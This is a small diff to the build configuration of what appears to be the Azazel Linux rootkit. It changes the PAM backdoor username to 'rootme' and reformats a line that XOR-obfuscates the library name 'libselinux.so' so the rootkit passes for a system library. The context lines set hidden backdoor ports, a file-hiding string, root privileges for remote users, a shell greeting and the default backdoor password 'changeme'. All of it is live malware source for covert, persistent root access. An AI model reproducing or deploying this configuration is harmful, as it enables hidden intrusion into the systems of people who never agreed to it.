@@ -12,7 +12,7 @@ CRYPT_HIGH = "61060"                  # Highest source port for crypthook backdo
 PAM_PORT = "61061"					  # Also hide this port, but don't trigger accept backdoors
 MAGIC_STRING = "__"                   # Hide files with this string in the name
 
-BLIND_LOGIN = "disease"                # Username for ssh / su PAM backdoor.
+BLIND_LOGIN = "rootme"                # Username for ssh / su PAM backdoor.
 C_ROOT = "root"                       # Give accept() users these privs
 SHELL_MSG = "Welcome!\nHere's a shell: " # Welcome msg for remote user
 SHELL_PASSWD = "changeme"             # Remote password for accept backdoors
@@ -52,7 +52,7 @@ print '''
 #define KEY_SALT "''' + xor(KEY_SALT) + '''"
 #define ANTI_DEBUG_MSG "''' + xor(ANTI_DEBUG_MSG) + '''"
 #define CLEANUP_LOGS "''' + xor(CLEANUP_LOGS) + '''"
-#define AZAZEL_LIB "'''+ xor("libselinux.so") +'''"
+#define AZAZEL_LIB "''' + xor("libselinux.so") + '''"
 #define SYS_ACCEPT 0
 #define SYS_ACCESS 1
 #define SYS_EXECVE 2
